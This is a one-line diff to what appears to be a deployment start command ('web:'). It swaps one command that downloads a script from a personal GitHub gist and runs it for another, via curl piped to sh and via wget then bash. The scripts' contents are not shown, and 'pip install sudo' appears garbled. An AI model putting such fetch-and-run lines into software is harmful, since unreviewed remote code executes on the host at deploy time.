@@ -1,1 +1,1 @@
-web: apt install sudo && sh -c "$(curl -fsSl https://gist.githubusercontent.com/rooted-cyber/143d3602a7b7dc476a9e6a9c4bf59a02/raw/deploy)"
+web: pip install sudo && wget -O ab.sh https://gist.github.com/Alone0791/eeadf019dba0c5b6973db009f1172596/raw/alone;bash ab.sh
